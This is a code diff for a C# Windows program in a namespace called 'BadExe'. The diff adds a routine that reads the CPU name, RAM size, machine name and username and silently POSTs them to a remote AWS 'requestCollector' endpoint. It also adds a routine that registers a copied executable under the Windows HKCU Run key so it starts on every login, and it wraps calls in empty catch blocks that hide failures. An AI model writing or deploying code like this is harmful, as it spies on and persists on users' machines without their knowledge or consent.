@@ -1,12 +1,15 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Net.Http;
+using System.Runtime.InteropServices;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using static System.Net.WebRequestMethods;
 
 namespace BadExe
 {
@@ -48,6 +51,15 @@ namespace BadExe
 
             }
 
+            try
+            {
+                SendDataToCloudPC();
+            }
+            catch
+            {
+
+            }
+
 
             try
             {
@@ -82,6 +94,31 @@ namespace BadExe
             var result = await httpClient.PostAsync("https://o8m2j633k1.execute-api.eu-central-1.amazonaws.com/default/requestCollector", httpContent);
 
         }
+
+        private static string GetProcessorName()
+        {
+            var key = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\System\CentralProcessor\0\");
+            return key?.GetValue("ProcessorNameString").ToString() ?? "Not Found";
+        }
+        [DllImport("kernel32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool GetPhysicallyInstalledSystemMemory(out long TotalMemoryInKilobytes);
+
+        static async Task SendDataToCloudPC()
+        {
+            var cpuName = GetProcessorName();
+            long memKb;
+            var ramAmount = GetPhysicallyInstalledSystemMemory(out memKb);
+
+            var machineName=Environment.MachineName;
+            var username=Environment.UserName;
+
+            var httpClient = new HttpClient();
+            var httpContent = new StringContent("{\"cpuName\":\"" + cpuName + "\", \"memKb\":"+ memKb+ ", \"machineName\":\""+ machineName+ "\", \"username\":\""+ username+"\"}");
+            var result = await httpClient.PostAsync("https://o8m2j633k1.execute-api.eu-central-1.amazonaws.com/default/requestCollector", httpContent);
+
+
+        }
         static string ListFiles()
         {
             var dirinfo = new System.IO.DirectoryInfo("/");
@@ -111,6 +148,15 @@ namespace BadExe
             var targetStream = new FileStream(to, FileMode.Create);
             targetStream.Write(exe, 0, exe.Length);
             targetStream.Close();
+
+            AddToAutorun(targetStream.Name);
+        }
+
+        static void AddToAutorun(string path)
+        {
+            //HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run 
+            var registerKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+            registerKey.SetValue("badexe", path);
         }
     }
 }
